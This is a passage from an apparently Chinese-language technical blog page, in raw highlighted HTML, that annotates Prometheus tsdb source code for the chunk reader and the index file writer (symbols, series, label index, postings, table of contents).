class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewDirReader</span><span class="params">(dir <span class="keyword">string</span>, pool chunkenc.Pool)</span> <span class="params">(*Reader, error)</span></span> &#123;</span><br><span class="line"> <span class="comment">// sequenceFiles()函数会读取指定chunks文件夹中的分段文件并按照文件名进行排序，这里不再展开</span></span><br><span class="line"> <span class="comment">// 介绍其具体实现，感兴趣的读者可以参考其源码进行学习</span></span><br><span class="line"> files, err := sequenceFiles(dir) </span><br><span class="line"> <span class="keyword">if</span> pool == <span class="literal">nil</span> &#123; <span class="comment">// 初始化Chunk池</span></span><br><span class="line"> pool = chunkenc.NewPool()</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">var</span> bs []ByteSlice</span><br><span class="line"> <span class="keyword">var</span> cs []io.Closer</span><br><span class="line"> <span class="keyword">for</span> _, fn := <span class="keyword">range</span> files &#123;</span><br><span class="line"> f, err := fileutil.OpenMmapFile(fn) <span class="comment">// 通过mmap系统调用将当前整个segment文件映射到内存</span></span><br><span class="line"> cs = <span class="built_in">append</span>(cs, f) <span class="comment">// 将映射得到的MmapFile实例追加到cs切片中</span></span><br><span class="line"> bs = <span class="built_in">append</span>(bs, realByteSlice(f.Bytes())) <span class="comment">// 将segment文件映射到bs切片中</span></span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">return</span> newReader(bs, cs, pool) <span class="comment">// 其中完成文件头的校验以及Reader实例的创建</span></span><br><span class="line">&#125;</span><br><span class="line">下面再来看Reader.Chunk()方法，该方法会根据传入的ref参数在当前chunks目录中查找对应Chunk数据位置，然后从Chunk池中获取一个空闲Chunk实例，最后从文件中读取时序数据填充到Chunk实例中，并将其返回。Chunk()方法的具体实现如下所示：</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *Reader)</span> <span class="title">Chunk</span><span class="params">(ref <span class="keyword">uint64</span>)</span> <span class="params">(chunkenc.Chunk, error)</span></span> &#123;</span><br><span class="line"> <span class="keyword">var</span> (</span><br><span class="line"> seq = <span class="keyword">int</span>(ref &gt;&gt; <span class="number">32</span>) <span class="comment">// 从ref参数的高32位中获取对应Chunk所在的segment文件编号</span></span><br><span class="line"> <span class="comment">// 从ref参数的低32位中获取Chunk在该segment文件中的字节偏移量</span></span><br><span class="line">  off = <span class="keyword">int</span>((ref &lt;&lt; <span class="number">32</span>) &gt;&gt; <span class="number">32</span>) </span><br><span class="line"> )</span><br><span class="line"> <span class="comment">// 检测seq编号是否合法，即检测seq编号是否大于chunks目录中最大编号(略)</span></span><br><span class="line"> b := s.bs[seq]</span><br><span class="line"> <span class="comment">// 查找到正确的segment文件之后，检测off偏移量是否合法，即检测off偏移量是否超过了</span></span><br><span class="line"> <span class="comment">// 该segment文件的大小(略)</span></span><br><span class="line"> <span class="comment">// 确定该Chunk所在的segment文件以及其在segment文件中的偏移量之后，下面会读取Chunk在文件</span></span><br><span class="line"> <span class="comment">// 中所占的字节数</span></span><br><span class="line">  r := b.Range(off, off+binary.MaxVarintLen32)</span><br><span class="line"> l, n := binary.Uvarint(r)</span><br><span class="line"> <span class="keyword">if</span> n &lt;= <span class="number">0</span> &#123;</span><br><span class="line"> <span class="keyword">return</span> <span class="literal">nil</span>, errors.Errorf(<span class="string">"reading chunk length failed with %d"</span>, n)</span><br><span class="line"> &#125;</span><br><span class="line"> r = b.Range(off+n, off+n+<span class="keyword">int</span>(l)) <span class="comment">// 获取ref对应的时序数据</span></span><br><span class="line"> <span class="comment">// 从Chunk池中获取一个空闲的Chunk实例，并将Encoding方式以及时序数据填充进去</span></span><br><span class="line"> <span class="keyword">return</span> s.pool.Get(chunkenc.Encoding(r[<span class="number">0</span>]), r[<span class="number">1</span>:<span class="number">1</span>+l])</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后，Reader.Close()方法会关闭当前Reader实例底层涉及到的全部segment文件，其实现比较简单，这里不再展开分析，感兴趣的读者可以参考其代码进行学习。</p><p><a href="https://link.jianshu.com/?t=https%3A%2F%2Fgodoc.org%2Fgithub.com%2Fprometheus%2Ftsdb%2Ffileutil" target="_blank" rel="noopener">fileutil</a> 提供了一些操作文件/目录的函数, 处理了不同平台 (主要是 win) 的兼容性问题.</p><h2 id="index"><a href="#index" class="headerlink" title="index"></a>index</h2><p><a href="https://link.jianshu.com?t=https%3A%2F%2Fgodoc.org%2Fgithub.com%2Fprometheus%2Ftsdb%2Findex" target="_blank" rel="noopener">index</a> 实现针对 labels 的索引.</p><p>在 prometheus/tsdb 中, 认为 labels + timestamp + value 是一个完整的数据点</p><p>chunks 相关的代码用于存储 timestamp + value, 而 index 则是对于 labels 的处理.</p><h5 id="encbuf-decbuf"><a href="#encbuf-decbuf" class="headerlink" title="encbuf, decbuf"></a>encbuf, decbuf</h5><p>作为 buffer 在 index 数据编码/解码时进行 复用</p><p>实际上这里也定义了一些数据格式如何进行存储</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// putVarintStr writes a string to the buffer prefixed by its varint length (in bytes!).</span></span><br><span class="line"><span class="comment">// 对于字符串, 分别写入长度及字符串本身</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(e *encbuf)</span> <span class="title">putUvarintStr</span><span class="params">(s <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">    b := *(*[]<span class="keyword">byte</span>)(unsafe.Pointer(&amp;s))</span><br><span class="line">    e.putUvarint(<span class="built_in">len</span>(b))</span><br><span class="line">    e.putString(s)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 相应地, 在解码时也会先确定 str 长度, 再从整个 []byte 中取出必要的部分</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(d *decbuf)</span> <span class="title">uvarintStr</span><span class="params">()</span> <span class="title">string</span></span> &#123;</span><br><span class="line">    l := d.uvarint64()</span><br><span class="line">    <span class="keyword">if</span> d.e != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(d.b) &lt; <span class="keyword">int</span>(l) &#123;</span><br><span class="line">        d.e = errInvalidSize</span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span></span><br><span class="line">    &#125;</span><br><span class="line">    s := <span class="keyword">string</span>(d.b[:l])</span><br><span class="line">    d.b = d.b[l:]</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="indexWriterSeries"><a href="#indexWriterSeries" class="headerlink" title="indexWriterSeries"></a>indexWriterSeries</h5><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> indexWriterSeries <span class="keyword">struct</span> &#123;</span><br><span class="line">    <span class="comment">// labels 的实际内容, 即 kv 对</span></span><br><span class="line">    labels labels.Labels</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 这里重要的实际是 Meta.Ref, 即每个 chunk 对应的文件/起点</span></span><br><span class="line">    chunks []chunks.Meta <span class="comment">// series file offset of chunks</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 这里是 labels 数据在文件中的 offset</span></span><br><span class="line">    offset <span class="keyword">uint32</span>        <span class="comment">// index file offset of series reference</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="indexTOC"><a href="#indexTOC" class="headerlink" title="indexTOC"></a>indexTOC</h5><p>index table of contents, 记录 index 不同类型数据的位置</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> indexTOC <span class="keyword">struct</span> &#123;</span><br><span class="line">    symbols           <span class="keyword">uint64</span></span><br><span class="line">    series            <span class="keyword">uint64</span></span><br><span class="line">    labelIndices      <span class="keyword">uint64</span></span><br><span class="line">    labelIndicesTable <span class="keyword">uint64</span></span><br><span class="line">    postings          <span class="keyword">uint64</span></span><br><span class="line">    postingsTable     <span class="keyword">uint64</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="Writer"><a href="#Writer" class="headerlink" title="Writer"></a>Writer</h5><p>实现 <a href="https://link.jianshu.com?t=https%3A%2F%2Fgithub.com%2Fprometheus%2Ftsdb%2Fblob%2Fd45b595a1daefad23c09a2d994bf956f8b5f15a9%2Fblock.go%23L32-L58" target="_blank" rel="noopener">IndexWriter</a> , 基于文件的 index 存储</p><p>index 的文件格式要比 chunk 复杂的多, 可以参考 <a href="https://link.jianshu.com?t=https%3A%2F%2Fgithub.com%2Fprometheus%2Ftsdb%2Fblob%2Fd45b595a1daefad23c09a2d994bf956f8b5f15a9%2FDocumentation%2Fformat%2Findex.md" target="_blank" rel="noopener">Documentation/format/index.md</a></p><p>每个 index 文件的写入分为 5 个阶段, 顺序执行.</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> indexWriterStage <span class="keyword">uint8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">    idxStageNone indexWriterStage = <span class="literal">iota</span></span><br><span class="line">    idxStageSymbols</span><br><span class="line">    idxStageSeries</span><br><span class="line">    idxStageLabelIndex</span><br><span class="line">    idxStagePostings</span><br><span class="line">    idxStageDone</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// ensureStage handles transitions between write stages and ensures that IndexWriter</span></span><br><span class="line"><span class="comment">// methods are called in an order valid for the implementation.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(w *Writer)</span> <span class="title">ensureStage</span><span class="params">(s indexWriterStage)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> w.stage == s &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 排在当前阶段之前的, 不可再执行</span></span><br><span class="line">    <span class="keyword">if</span> w.stage &gt; s &#123;</span><br><span class="line">        <span class="keyword">return</span> errors.Errorf(<span class="string">"invalid stage %q, currently at %q"</span>, s, w.stage)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Mark start of sections in table of contents.</span></span><br><span class="line">    <span class="keyword">switch</span> s &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 执行到完成阶段时, 自动写入必要的辅助信息</span></span><br><span class="line">    <span class="keyword">case</span> idxStageDone:</span><br><span class="line">        w.toc.labelIndicesTable = w.pos</span><br><span class="line">        <span class="keyword">if</span> err := w.writeOffsetTable(w.labelIndexes); err != <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> err</span><br><span class="line">        &#125;</span><br><span class="line">        w.toc.postingsTable = w.pos</span><br><span class="line">        <span class="keyword">if</span> err := w.writeOffsetTable(w.postings); err != <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> err</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> err := w.writeTOC(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> err</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    w.stage = s</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>AddSymbols</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(w *Writer)</span> <span class="title">AddSymbols</span><span class="params">(sym <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">struct</span>&#123;&#125;)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> err := w.ensureStage(idxStageSymbols); err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> err</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> errors.Wrap(err, <span class="string">"write symbols"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>label 中的每一个键或值都是一个 symbol.</p><p>通过 “使用对 symbol 的引用” 的方式, 来缩减后续索引文件中的空间占用.</p><p><strong>AddSeries</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(w *Writer)</span> <span class="title">AddSeries</span><span class="params">(ref <span class="keyword">uint64</span>, lset labels.Labels, chunks ...chunks.Meta)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> err := w.ensureStage(idxStageSeries); err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> err</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> labels.Compare(lset, w.lastSeries) &lt;= <span class="number">0</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> errors.Errorf(<span class="string">"out-of-order series added with label set %q"</span>, lset)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 记录每个时间序列的位置</span></span><br><span class="line">    <span class="keyword">if</span> _, ok := w.seriesOffsets[ref]; ok &#123;</span><br><span class="line">        <span class="keyword">return</span> errors.Errorf(<span class="string">"series with reference %d already added"</span>, ref)</span><br><span class="line">    &#125;</span><br><span class="line">    w.seriesOffsets[ref] = w.pos</span><br><span class="line"></span><br><span class="line">    w.buf2.reset()</span><br><span class="line">    w.buf2.putUvarint(<span class="built_in">len</span>(lset))</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 对于每个 label, 分别记录 它的 name 和 value 在索引文件中的位置</span></span><br><span class="line">    <span class="keyword">for</span> _, l := <span class="keyword">range</span> lset &#123;</span><br><span class="line">        offset, ok := w.symbols[l.Name]</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">        offset, ok = w.symbols[l.Value]</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    w.buf2.putUvarint(<span class="built_in">len</span>(chunks))</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 对于 chunk 数据, 记录它覆盖的时间范围, 以及存储地址</span></span><br><span class="line">    <span class="comment">// 除第一个 chunk 外, 其他记录的都是变化量</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(chunks) &gt; <span class="number">0</span> &#123;</span><br><span class="line">        c := chunks[<span class="number">0</span>]</span><br><span class="line">        w.buf2.putVarint64(c.MinTime)</span><br><span class="line">        w.buf2.putUvarint64(<span class="keyword">uint64</span>(c.MaxTime - c.MinTime))</span><br><span class="line">        w.buf2.putUvarint64(c.Ref)</span><br><span class="line">        t0 := c.MaxTime</span><br><span class="line">        ref0 := <span class="keyword">int64</span>(c.Ref)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> _, c := <span class="keyword">range</span> chunks[<span class="number">1</span>:] &#123;</span><br><span class="line">            w.buf2.putUvarint64(<span class="keyword">uint64</span>(c.MinTime - t0))</span><br><span class="line">            w.buf2.putUvarint64(<span class="keyword">uint64</span>(c.MaxTime - c.MinTime))</span><br><span class="line">            t0 = c.MaxTime</span><br><span class="line"></span><br><span class="line">            w.buf2.putVarint64(<span class="keyword">int64</span>(c.Ref) - ref0)</span><br><span class="line">            ref0 = <span class="keyword">int64</span>(c.Ref)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>WriteLabelIndex</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这里传入的参数可以认为是下述结构</span></span><br><span class="line"><span class="comment">// 其中每一组 value 都是 names 的一组取值组合</span></span><br><span class="line"><span class="comment">// type Label struct &#123;</span></span><br><span class="line"><span class="comment">//  names []string</span></span><br><span class="line"><span class="comment">//  valus [][]string</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(w *Writer)</span> <span class="title">WriteLabelIndex</span><span class="params">(names []<span class="keyword">string</span>, values []<span class="keyword">string</span>)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(values)%<span class="built_in">len</span>(names) != <span class="number">0</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> errors.Errorf(<span class="string">"invalid value list length %d for %d names"</span>, <span class="built_in">len</span>(values), <span class="built_in">len</span>(names))</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> err := w.ensureStage(idxStageLabelIndex); err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> errors.Wrap(err, <span class="string">"ensure stage"</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 所有 hash entry 会统一在后续阶段写入</span></span><br><span class="line">    w.labelIndexes = <span class="built_in">append</span>(w.labelIndexes, hashEntry&#123;</span><br><span class="line">        keys:   names,</span><br><span class="line">        offset: w.pos,</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 对于每个 value, 都只写入引用值</span></span><br><span class="line">    <span class="keyword">for</span> _, v := <span class="keyword">range</span> valt.s &#123;</span><br><span class="line">        offset, ok := w.symbols[v]</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">    err = w.write(w.buf1.get(), w.buf2.get())</span><br><span class="line">    <span class="keyword">return</span> errors.Wrap(err, <span class="string">"write label index"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>WritePostings</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Postings 用来记录每一个 label (一对 name, value) 对应了哪些数据块, 用于检索</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(w *Writer)</span> <span class="title">WritePostings</span><span class="params">(name, value <span class="keyword">string</span>, it Postings)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 每一对 name-value 对应的数据位置</span></span><br><span class="line">    w.postings = <span class="built_in">append</span>(w.postings, hashEntry&#123;</span><br><span class="line">        keys:   []<span class="keyword">string</span>&#123;name, value&#125;,</span><br><span class="line">        offset: w.pos,</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Order of the references in the postings list does not imply order</span></span><br><span class="line">    <span class="comment">// of the series references within the persisted block they are mapped to.</span></span><br><span class="line">    <span class="comment">// We have to sort the new references again.</span></span><br><span class="line">    refs := w.uint32s[:<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> it.Next() &#123;</span><br><span class="line">        offset, ok := w.seriesOffsets[it.At()]</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">        </span><br><span class="line">        refs = <span class="built_in">append</span>(refs, <span class="keyword">uint32</span>(offset))</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> err := it.Err(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> err</span><br><span class="line">    &#125;</span><br><span class="line">    sort.Sort(uint32slice(refs))</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">    err := w.write(w.buf1.get(), w.buf2.get())</span><br><span class="line">    <span class="keyword">return</span> errors.Wrap(err, <span class="string">"write postings"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Close</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(w *Writer)</span> <span class="title">Close</span><span class="params">()</span> <span class="title">error</span></span> &#123;</span><br><span class="line">    <span class="comment">// 这里会自动执行 labelIndexes, postings, toc 的写入</span></span><br><span class="line">    <span class="keyword">if</span> err := w.ensureStage(idxStageDone); err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> err</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 文件落盘</span></span><br><span class="line">    <span class="keyword">if</span> err := w.fbuf.Flush(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> err</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> err := fileutil.Fsync(w.f); err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> err</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> w.f.Close()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// writeOffsetTable writes a sequence of readable hash entries.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(w *Writer)</span> <span class="title">writeOffsetTable</span><span class="params">(entries []hashEntry)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">    w.buf2.reset()</span><br><span class="line">    w.buf2.putBE32int(<span class="built_in">len</span>(entries))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> _, e := <span class="keyword">range</span> entries &#123;</span><br><span class="line">        w.buf2.putUvarint(<span class="built_in">len</span>(e.keys))</span><br><span class="line">        <span class="keyword">for</span> _, k := <span class="keyword">range</span> e.keys &#123;</span><br><span class="line">            w.buf2.putUvarintStr(k)</span><br><span class="line">        &#125;</span><br><span class="line">        w.buf2.putUvarint64(e.offset)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    w.buf1.reset()</span><br><span class="line">    w.buf1.putBE32int(w.buf2.<span class="built_in">len</span>())</span><br><span class="line">    w.buf2.putHash(w.crc32)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> w.write(w.buf1.get(), w.buf2.get())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(w *Writer)</span> <span class="title">writeTOC</span><span class="params">()</span> <span class="title">error</span></span> &#123;</span><br><span class="line">    w.buf1.reset()</span><br><span class="line"></span><br><span class="line">    w.buf1.putBE64(w.toc.symbols)</span><br><span class="line">    w.buf1.putBE64(w.toc.series)</span><br><span class="line">    w.buf1.putBE64(w.toc.labelIndices)</span><br><span class="line">    w.buf1.putBE64(w.toc.labelIndicesTable)</span><br><span class="line">    w.buf1.putBE64(w.toc.postings)</span><br><span class="line">    w.buf1.putBE64(w.toc.postingsTable)</span><br><span class="line"></span><br><span class="line">    